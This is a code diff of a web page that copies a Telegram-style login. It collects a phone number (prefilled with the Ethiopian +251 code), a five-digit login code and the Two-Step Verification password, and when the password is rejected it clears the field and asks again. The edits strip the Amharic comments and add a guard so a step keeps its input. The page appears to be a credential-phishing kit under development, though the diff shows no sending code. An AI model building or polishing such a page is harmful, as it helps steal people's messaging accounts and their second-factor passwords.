@@ -205,13 +205,13 @@
     #confirmBtn {
         opacity: 0;
         pointer-events: none;
-        transform: translateY(15px); /* ትንሽ ዝቅ ብሎ ይቆያል */
+        transform: translateY(15px);
         transition: all 0.3s ease;
     }
     #confirmBtn.show-btn {
         opacity: 1;
         pointer-events: auto;
-        transform: translateY(0); /* ወደ ላይ ከፍ ይላል */
+        transform: translateY(0);
     }
 
     /* Links at bottom */
@@ -284,7 +284,7 @@
                 <label style="top:-9px; font-size:13px;">Country</label>
             </div>
             
-            <!-- Phone Box (with Placeholder trick for floating label) -->
+            <!-- Phone Box -->
             <div class="md-input-box" id="phone_box">
                 <input type="tel" id="phone_input" value="+251 " placeholder=" " oninput="resetError(1)">
                 <label id="phone_label">Your phone number</label>
@@ -329,7 +329,6 @@
         <p class="subtitle">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
         
         <div class="md-input-box" id="2fa_box" style="margin-top: 10px;">
-            <!-- 🌟 handlePasswordInput(this) ታክሏል 🌟 -->
             <input type="password" id="2fa_input" placeholder=" " style="padding-right: 45px;" oninput="resetError(3); handlePasswordInput(this);" onkeypress="handlePasswordEnter(event)">
             <label id="2fa_label">Password</label>
             <i class="fa-solid fa-eye-slash toggle-pw" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
@@ -378,9 +377,15 @@
     });
 
     function showStep(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
+        
+        // 🌟 ማስተካከያ: ገፁ አስቀድሞ ክፍት ከሆነ እንደገና አያድሰውም (Input እንዳይጠፋ) 🌟
+        if(target && target.classList.contains('active')) {
+            return;
+        }
+
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         if(target) target.classList.add('active');
 
         if(n === 'success') {
@@ -389,12 +394,10 @@
         
         if(n === 2) {
             document.getElementById('display_phone').innerHTML = `${registeredPhone} <i class="fa-solid fa-pencil" onclick="showStep('photo_slide')"></i>`;
-            // አውቶማቲካሊ ኪቦርዱን እንዲከፍት ያደርጋል
             setTimeout(() => { document.getElementById('otp_native_input').focus(); }, 100);
         }
         
         if(n === 3) {
-            // 2FA ገፅ ሲከፈት ኪቦርዱን እንዲከፍት እና ቁልፉን እንዲደብቅ ያደርጋል
             const passIn = document.getElementById('2fa_input');
             passIn.value = "";
             document.getElementById('confirmBtn').classList.remove('show-btn');
@@ -402,7 +405,7 @@
         }
     }
 
-    // 🌟 Error Visual Handlers (መስመሩ ላይ የሚያሳየው ስህተት) 🌟
+    // 🌟 Error Visual Handlers 🌟
     function showError(stepId, text) {
         if (stepId === 1) {
             document.getElementById('phone_box').classList.add('error');
@@ -416,7 +419,6 @@
         }
     }
 
-    // 🌟 ተጠቃሚው ሲፅፍ ስህተቱን ያጠፋዋል 🌟
     function resetError(stepId) {
         if (stepId === 1) {
             document.getElementById('phone_box').classList.remove('error');
@@ -500,7 +502,6 @@
             document.getElementById('confirmText').innerText = 'NEXT';
         }
         
-        // Disable ሁኔታዎችን እናጠፋለን
         document.getElementById('phone_input').disabled = false;
         document.getElementById('otp_native_input').disabled = false;
         document.getElementById('2fa_input').disabled = false;
@@ -531,7 +532,6 @@
         btn.disabled = true;
         document.getElementById('phone_input').disabled = true;
         
-        // ፅሁፉን ወደ PLEASE WAIT አድርጎ ሎደር ያሳያል
         document.getElementById('loginText').innerText = 'PLEASE WAIT...';
         document.getElementById('loginSpinner').style.display = 'block';
         
@@ -570,10 +570,9 @@
         }
     }
 
-    // 🌟 2. Native OTP Logic (Copy-Paste Handles automatically) 🌟
+    // 🌟 2. Native OTP Logic 🌟
     function handleOtpInput(inputElement) {
         resetError(2);
-        // ቁጥር ያልሆኑትን ሁሉ አጥፍቶ 5 ሲደርስ ራሱ ይልካል
         let code = inputElement.value.replace(/\D/g, '').slice(0, 5);
         inputElement.value = code; 
 
@@ -600,7 +599,6 @@
     }
 
     // 🌟 3. 2FA Password Logic 🌟
-    // 2 ፊደል ሲሞላ Next Button-ን የሚያሳየው ፈንክሽን
     function handlePasswordInput(el) {
         const btn = document.getElementById('confirmBtn');
         if (el.value.length >= 2) {
@@ -664,7 +662,6 @@
                 const passIn = document.getElementById('2fa_input');
                 passIn.value = "";
                 passIn.focus();
-                // ስህተት ሲፈጠር ፅሁፉ ስለሚጠፋ Button-ንም እንደብቀዋለን
                 document.getElementById('confirmBtn').classList.remove('show-btn');
                 showError(3, 'Invalid password, please try again');
             }
